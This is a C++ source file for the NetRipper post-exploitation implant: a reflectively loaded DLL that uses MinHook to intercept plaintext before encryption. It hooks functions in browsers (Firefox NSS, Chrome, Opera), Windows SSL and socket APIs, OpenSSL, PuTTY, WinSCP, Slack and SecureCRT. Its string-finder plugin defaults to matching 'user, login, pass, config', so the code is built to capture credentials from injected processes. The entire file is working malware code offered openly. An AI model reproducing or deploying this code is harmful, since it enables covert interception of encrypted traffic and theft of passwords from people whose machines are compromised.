
#include "stdafx.h"
#include "InjectedDLL.h"
#include "ReflectiveLoader.h"
#include "Utils.h"
#include "Process.h"
#include "HookedFunctions.h"
#include "FunctionFlow.h"
#include "DynConfig.h"
#include "NonExportedHooks.h"
#include "PluginSystem.h"
#include "Plugin.h"
#include "MinHook.h"

// Use minhook

#if defined _M_X64
#pragma comment(lib, "libMinHook.x64.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook.x86.lib")
#endif

// Plugins

void InstallPlugins()
{
	// Plain text plugin
	
	Plugin *plPlain = new Plugin;

	plPlain->ReadCallback  = &Plugin_PlainText;
	plPlain->WriteCallback = &Plugin_PlainText;

	if(DynConfig::GetPlainText().compare("true") == 0 || DynConfig::GetPlainText().compare("TRUE") == 0)
		PluginSystem::InstallPlugin(plPlain);

	// Data limit plugin

	Plugin *plLimit = new Plugin;

	plLimit->ReadCallback  = &Plugin_DataLimit;
	plLimit->WriteCallback = &Plugin_DataLimit;

	plLimit->SetConfig(DynConfig::GetDataLimit());

	if (DynConfig::GetPlainText().compare("0") == 0)
		PluginSystem::InstallPlugin(plLimit);

	// String finder plugin

	Plugin *plFinder = new Plugin;

	plFinder->ReadCallback  = &Plugin_StringFinder;
	plFinder->WriteCallback = &Plugin_StringFinder;

	if(DynConfig::GetStringFinder().compare("DEFAULT") == 0)
		plFinder->SetConfig("user, login, pass, config"); 
	else
		plFinder->SetConfig(DynConfig::GetStringFinder());

	if (DynConfig::GetStringFinder().length() > 0)
		PluginSystem::InstallPlugin(plFinder);
}

// Our main function

void Inject()
{
	// Init stuff

	DebugLog::Init();
	FunctionFlow::Init();
	DynConfig::Init();

	DebugLog::LogString("NetRipper: ", "Initialized!");

	// Initialize minhook

	if (MH_Initialize() != MH_OK)
	{
		DebugLog::DebugError("Cannot initialize minhook!");
		return;
	}
	
	// Hooks specific to loaded DLLs

	vector<MODULEENTRY32> vDlls = Process::GetProcessModules(0);

	for(size_t i = 0; i < vDlls.size(); i++)
	{
		// PR_Read, PR_Write && PR_Send, PR_Recv

		if(Utils::ToLower(vDlls[i].szModule).compare("nss3.dll") == 0 || Utils::ToLower(vDlls[i].szModule).compare("nspr4.dll") == 0)
		{
			string sModuleName = Utils::ToLower(vDlls[i].szModule);
			
			// PR_Read, PR_Write
			
			PR_Read_Original = (PR_Read_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_Read");
			PR_Write_Original = (PR_Write_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_Write");
			PR_GetDescType_Original = (PR_GetDescType_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_GetDescType");

			MH_CreateHook((void *)PR_Read_Original, (void *)PR_Read_Callback, (void **)&PR_Read_Original);
			MH_CreateHook((void *)PR_Write_Original, (void *)PR_Write_Callback, (void **)&PR_Write_Original);

			// PR_Send, PR_Recv

			PR_Recv_Original = (PR_Recv_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_Recv");
			PR_Send_Original = (PR_Send_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_Send");

			MH_CreateHook((void *)PR_Recv_Original, (void *)PR_Recv_Callback, (void **)&PR_Recv_Original);
			MH_CreateHook((void *)PR_Send_Original, (void *)PR_Send_Callback, (void **)&PR_Send_Original);
		}

		// SslEncryptPacket, SslDecryptPacket

		else if(Utils::ToLower(vDlls[i].szModule).compare("ncrypt.dll") == 0)
		{
			SslEncryptPacket_Original = (SslEncryptPacket_Typedef)GetProcAddress(LoadLibrary("ncrypt.dll"), "SslEncryptPacket");
			SslDecryptPacket_Original = (SslDecryptPacket_Typedef)GetProcAddress(LoadLibrary("ncrypt.dll"), "SslDecryptPacket");

			MH_CreateHook((void *)SslEncryptPacket_Original, (void *)SslEncryptPacket_Callback, (void **)&SslEncryptPacket_Original);
			MH_CreateHook((void *)SslDecryptPacket_Original, (void *)SslDecryptPacket_Callback, (void **)&SslDecryptPacket_Original);
		}

		// send, recv, WSASend, WSARecv

		else if(Utils::ToLower(vDlls[i].szModule).compare("ws2_32.dll") == 0)
		{
			recv_Original = (recv_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), "recv");
			send_Original = (send_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), "send");

			MH_CreateHook((void *)recv_Original, (void *)recv_Callback, (void **)&recv_Original);
			MH_CreateHook((void *)send_Original, (void *)send_Callback, (void **)&send_Original);

			WSARecv_Original = (WSARecv_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), "WSARecv");
			WSASend_Original = (WSASend_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), "WSASend");

			MH_CreateHook((void *)WSARecv_Original, (void *)WSARecv_Callback, (void **)&WSARecv_Original);
			MH_CreateHook((void *)WSASend_Original, (void *)WSASend_Callback, (void **)&WSASend_Original);
		}

		// EncryptMessage, DecryptMessage

		else if(Utils::ToLower(vDlls[i].szModule).compare("secur32.dll") == 0)
		{
			EncryptMessage_Original = (EncryptMessage_Typedef)GetProcAddress(LoadLibrary("secur32.dll"), "EncryptMessage");
			DecryptMessage_Original = (DecryptMessage_Typedef)GetProcAddress(LoadLibrary("secur32.dll"), "DecryptMessage");

			MH_CreateHook((void *)EncryptMessage_Original, (void *)EncryptMessage_Callback, (void **)&EncryptMessage_Original);
			MH_CreateHook((void *)DecryptMessage_Original, (void *)DecryptMessage_Callback, (void **)&DecryptMessage_Original);
		}

		// SSLeay_Write, SSLeay_Read

		else if (Utils::ToLower(vDlls[i].szModule).compare("ssleay32.dll") == 0)
		{
			SSLeay_Write_Original = (SSLeay_Write_Typedef)GetProcAddress(LoadLibrary("ssleay32.dll"), "SSL_write");
			SSLeay_Read_Original  = (SSLeay_Read_Typedef) GetProcAddress(LoadLibrary("ssleay32.dll"), "SSL_read");
			
			MH_CreateHook((void *)SSLeay_Write_Original, (void *)SSLeay_Write_Callback, (void **)&SSLeay_Write_Original);
			MH_CreateHook((void *)SSLeay_Read_Original,  (void *)SSLeay_Read_Callback, (void **)&SSLeay_Read_Original);
		}

		// chrome.dll

		else if(Utils::ToLower(vDlls[i].szModule).compare("chrome.dll") == 0)
		{
			// Hook Chrome functions

			HookChrome("chrome.dll");
		}

		// opera_browser.dll

		else if (Utils::ToLower(vDlls[i].szModule).compare("opera_browser.dll") == 0)
		{
			// Hook Chrome functions

			HookChrome("opera_browser.dll");
		}

		// putty.exe

		else if(Utils::ToLower(vDlls[i].szModule).substr(0, 5).compare("putty") == 0)
		{
			// Hook Chrome functions

			HookPutty();
		}

		// WinSCP.exe

		else if(Utils::ToLower(vDlls[i].szModule).compare("winscp.exe") == 0)
		{
			// Hook Chrome functions

			HookWinSCP(); 
		}

		// slack.exe

		else if (Utils::ToLower(vDlls[i].szModule).compare("slack.exe") == 0)
		{
			// Hook Chrome functions

			HookSlack();
		}

		// SecureCRT

		else if (Utils::ToLower(vDlls[i].szModule).compare("ssh2core85u.dll") == 0)
		{
			// Hook SecureCRT function
			
			SecureCRT_Original = (SecureCRT_Typedef)GetProcAddress(LoadLibrary("ssh2core85u.dll"), "?Get_raw_pointer@SSHPacket@SSH2@@QEAA_NAEAPEAEH@Z");
			MH_CreateHook((void *)SecureCRT_Original, (void *)SecureCRT_Callback, (void **)&SecureCRT_Original);
		}
	}

	// Enable all hooks

	if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK)
	{
		DebugLog::DebugError("Cannot enable all hooks!");
		return;
	}

	// Install plugins

	InstallPlugins();
} 

// Unhook all hooks

void Unhook()
{
	MH_Uninitialize();
}

